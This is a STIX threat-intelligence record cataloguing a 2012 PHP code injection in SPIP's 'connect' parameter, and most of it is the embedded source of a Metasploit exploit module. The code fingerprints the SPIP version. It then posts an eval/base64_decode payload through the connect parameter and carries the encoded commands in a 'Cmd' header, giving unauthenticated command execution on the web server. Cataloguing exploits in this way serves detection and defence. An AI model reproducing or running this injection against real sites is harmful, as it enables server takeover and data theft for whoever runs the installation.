{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c6dba707-e600-40b8-902e-615c114c9ac0",
    "created": "2024-08-14T17:13:24.220501Z",
    "modified": "2024-08-14T17:13:24.220505Z",
    "name": "SPIP connect Parameter PHP Injection",
    "description": " This module exploits a PHP code injection in SPIP. The vulnerability exists in the connect parameter and allows an unauthenticated user to execute arbitrary commands with web user privileges. Branches 2.0, 2.1 and 3 are concerned. Vulnerable versions are <2.0.21, <2.1.16 and < 3.0.3, but this module works only against branch 2.0 and has been tested successfully with SPIP 2.0.11 and SPIP 2.0.20 with Apache on Ubuntu and Fedora linux distributions. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/spip_connect_exec.rb",
            "external_id": "spip_connect_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://contrib.spip.net/SPIP-3-0-3-2-1-16-et-2-0-21-a-l-etape-303-epate-la"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'SPIP connect Parameter PHP Injection',\n      'Description'    => %q{\n        This module exploits a PHP code injection in SPIP. The vulnerability exists in the\n        connect parameter and allows an unauthenticated user to execute arbitrary commands\n        with web user privileges. Branches 2.0, 2.1 and 3 are concerned. Vulnerable versions\n        are <2.0.21, <2.1.16 and < 3.0.3, but this module works only against branch 2.0 and\n        has been tested successfully with SPIP 2.0.11 and SPIP 2.0.20 with Apache on Ubuntu\n        and Fedora linux distributions.\n      },\n      'Author'         =>\n        [\n          'Arnaud Pachot',   #Initial discovery\n          'Frederic Cikala', # PoC\n          'Davy Douhine'     # PoC and MSF module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '83543' ],\n          [ 'BID', '54292' ],\n          [ 'URL', 'http://contrib.spip.net/SPIP-3-0-3-2-1-16-et-2-0-21-a-l-etape-303-epate-la' ]\n        ],\n      'Privileged'     => false,\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2012-07-04'))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base path to SPIP application', '/']),\n      ])\n  end\n\n  def check\n    version = nil\n    uri = normalize_uri(target_uri.path, \"spip.php\")\n\n    res = send_request_cgi({ 'uri' => \"#{uri}\" })\n\n    if res and res.code == 200 and res.body =~ /<meta name=\"generator\" content=\"SPIP (.*) \\[/\n      version = $1\n    end\n\n    if version.nil? and res.code == 200 and res.headers[\"Composed-By\"] =~ /SPIP (.*) @/\n      version = $1\n    end\n\n    if version.nil?\n      return Exploit::CheckCode::Unknown\n    end\n\n    vprint_status(\"SPIP Version detected: #{version}\")\n\n    if version =~ /^2\\.0/ and version < \"2.0.21\"\n      return Exploit::CheckCode::Appears\n    elsif version =~ /^2\\.1/ and version < \"2.1.16\"\n      return Exploit::CheckCode::Appears\n    elsif version =~ /^3\\.0/ and version < \"3.0.3\"\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n\n  end\n\n  def exploit\n    uri = normalize_uri(target_uri.path, 'spip.php')\n    print_status(\"#{rhost}:#{rport} - Attempting to exploit...\")\n    res = send_request_cgi(\n      {\n        'uri'    => uri,\n        'method' => 'POST',\n        'vars_post' => {\n          'connect' => \"?><? eval(base64_decode($_SERVER[HTTP_CMD])); ?>\",\n        },\n        'headers' => {\n          'Cmd' => Rex::Text.encode_base64(payload.encoded)\n        }\n      })\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-07-04",
    "x_mitre_platforms": [
        "['php']"
    ]
}